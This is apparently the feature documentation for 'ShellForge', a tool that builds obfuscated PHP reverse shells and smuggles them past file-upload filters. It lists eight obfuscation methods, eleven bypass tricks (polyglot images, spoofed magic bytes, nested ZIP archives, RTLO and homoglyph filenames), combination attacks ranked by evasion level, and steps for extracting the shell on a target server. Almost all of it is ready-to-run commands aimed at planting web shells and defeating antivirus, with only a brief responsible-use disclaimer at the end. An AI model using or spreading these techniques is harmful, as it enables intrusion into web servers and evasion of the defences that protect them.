# ShellForge - 2025 Advanced Features

## 🚀 NEW IN 2025

### 🔐 Advanced Obfuscation Methods (8 New Methods)

#### 1. AES-Style Obfuscation
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate aes
```
- Combines XOR encryption + Base64
- Harder to detect than single-layer encoding

#### 2. GZIP Compression
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate gzip
```
- Compresses shell code using zlib
- Reduces size and bypasses string matching

#### 3. Double Base64 Encoding
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate double_encode
```
- Base64 encoded twice
- Evades simple base64 decoders

#### 4. Unicode Escape
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate unicode_escape
```
- Converts to \\uXXXX format
- Bypasses regex-based detection

#### 5. Character Code Encoding
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate char_encode
```
- Converts to chr() array
- Example: `eval(implode(array_map("chr",array(60,63,112))))`

#### 6. Variable Chain
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate variable_chain
```
- Splits code into variable chunks
- Concatenates at runtime

#### 7. Zero-Width Characters
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate zero_width
```
- Inserts invisible characters
- Same visual appearance, different hash

#### 8. Polymorphic
```bash
./shellforge.py 192.168.1.100 4444 php --obfuscate polymorphic
```
- Random obfuscation each time
- Never the same hash twice
- Adds random comments

---

## 🛡️ Upload Filter Bypass Methods (11 Methods)

### File Extension Bypasses

#### 1. Double Extension
```bash
./shellforge.py 192.168.1.100 4444 php --bypass double_extension --output shell.php
# Creates: shell.php.php
```
**Use Case:** When server checks only last extension

#### 2. Null Byte Injection
```bash
./shellforge.py 192.168.1.100 4444 php --bypass null_byte --output shell.php
# Creates: shell.php%00.png
```
**Use Case:** Older PHP versions (< 5.3.4)

#### 3. Case Manipulation
```bash
./shellforge.py 192.168.1.100 4444 php --bypass case_manipulation --output shell.php
# Creates: ShElL.PhP
```
**Use Case:** Case-insensitive file systems

#### 4. Special Characters
```bash
./shellforge.py 192.168.1.100 4444 php --bypass special_chars --output shell.php
# Creates: shell.ph%20p
```
**Use Case:** URL encoding bypass

---

### Content-Based Bypasses

#### 5. Content-Type Spoofing
```bash
./shellforge.py 192.168.1.100 4444 png --bypass content_type --output image.png
```
**Features:**
- Adds proper magic bytes (PNG, JPEG, GIF, PDF)
- File appears as valid image to `file` command
- PHP code embedded after header

#### 6. Polyglot Files
```bash
./shellforge.py 192.168.1.100 4444 png --bypass polyglot --output image.png
```
**Features:**
- Valid image + working PHP
- Can be displayed as image AND executed

#### 7. Magic Bytes
```bash
./shellforge.py 192.168.1.100 4444 pdf --bypass magic_bytes --output document.pdf
```
**Supported:**
- PNG, JPG, GIF, PDF, ZIP, RAR, DOC, DOCX, XLS, XLSX

---

### Archive Bypasses (MOST POWERFUL!)

#### 8. ZIP in ZIP
```bash
./shellforge.py 192.168.1.100 4444 php --bypass zip_in_zip --output payload.zip
```
**Structure:**
```
payload.zip
└── payload.zip
    └── payload.php  (your shell)
```
**Use Case:** 
- Bypass scanners that only check first level
- Extract on server to get shell

#### 9. Nested Archive (3 Levels Deep)
```bash
./shellforge.py 192.168.1.100 4444 php --bypass nested_archive --output deep.zip
```
**Structure:**
```
deep.zip
└── level2.zip
    └── level1.zip
        └── deep.php  (your shell)
```
**Use Case:**
- Maximum nesting for deep scan evasion
- Extract multiple times on server

---

### Unicode Bypasses

#### 10. RTLO (Right-to-Left Override)
```bash
./shellforge.py 192.168.1.100 4444 php --bypass rtlo --output shell.php
# Creates: shell<RTLO>gnp.php
# Displays as: shell.php
# Actually: shellphp.png
```
**Use Case:** Visual spoofing in file managers

#### 11. Unicode Homoglyph
```bash
./shellforge.py 192.168.1.100 4444 php --bypass unicode_homoglyph --output shell.php
# Creates: shеll.php (Cyrillic 'е' instead of 'e')
```
**Use Case:** Bypass string-based filename filters

---

## 🎯 Combination Attacks

### Example 1: Maximum Evasion
```bash
./shellforge.py 192.168.1.100 4444 php \
  --obfuscate polymorphic \
  --bypass zip_in_zip \
  --output ultimate.zip
```
**Features:**
- Polymorphic obfuscation (different every time)
- Nested in ZIP
- Maximum detection evasion

### Example 2: Image Upload Bypass
```bash
./shellforge.py 192.168.1.100 4444 png \
  --bypass polyglot \
  --obfuscate double_encode \
  --output photo.png
```
**Features:**
- Valid PNG image
- Double base64 encoded PHP
- Can be displayed AND executed

### Example 3: Deep Archive Evasion
```bash
./shellforge.py 192.168.1.100 4444 php \
  --obfuscate aes \
  --bypass nested_archive \
  --output package.zip
```
**Features:**
- 3-level deep nesting
- AES-style encryption
- Requires 3 extractions to reach shell

---

## 📊 Comparison Matrix

| Method | Evasion Level | Complexity | Use Case |
|--------|---------------|------------|----------|
| double_extension | ⭐⭐ | Low | Basic filters |
| content_type | ⭐⭐⭐ | Medium | MIME checks |
| polyglot | ⭐⭐⭐⭐ | High | Image+Code |
| zip_in_zip | ⭐⭐⭐⭐⭐ | Medium | Deep scans |
| nested_archive | ⭐⭐⭐⭐⭐ | High | Maximum evasion |
| polymorphic | ⭐⭐⭐⭐⭐ | High | Signature evasion |

---

## 🔍 Detection Comparison

### Old Methods (Pre-2025)
- ❌ Easily detected by AV
- ❌ Same hash every time
- ❌ Simple pattern matching catches them
- ❌ Single-layer encoding

### 2025 Methods
- ✅ Polymorphic (different hash each time)
- ✅ Multi-layer obfuscation
- ✅ Archive nesting bypasses depth limits
- ✅ Unicode tricks bypass string filters
- ✅ Magic bytes fool file type checkers

---

## 💡 Pro Tips

### 1. Layering
Combine multiple techniques:
```bash
./shellforge.py 192.168.1.100 4444 png \
  --obfuscate polymorphic \
  --bypass polyglot \
  --output ultimate.png
```

### 2. Archive Extraction
After uploading ZIP:
```bash
# On target server
unzip payload.zip
unzip payload.zip  # second zip
# Now you have payload.php
```

### 3. Testing
Always test bypasses in safe environment first!

---

## 🎓 Learning Path

1. **Beginner:** Start with double_extension
2. **Intermediate:** Try content_type and polyglot
3. **Advanced:** Master zip_in_zip
4. **Expert:** Combine multiple methods

---

## ⚠️ Responsible Use

These advanced techniques are for:
- ✅ Authorized penetration testing
- ✅ Security research
- ✅ Educational purposes
- ✅ Bug bounty programs

NOT for:
- ❌ Unauthorized access
- ❌ Malicious activities
- ❌ Illegal purposes

---

**ShellForge 2025** - Leading edge security research tools! 🚀
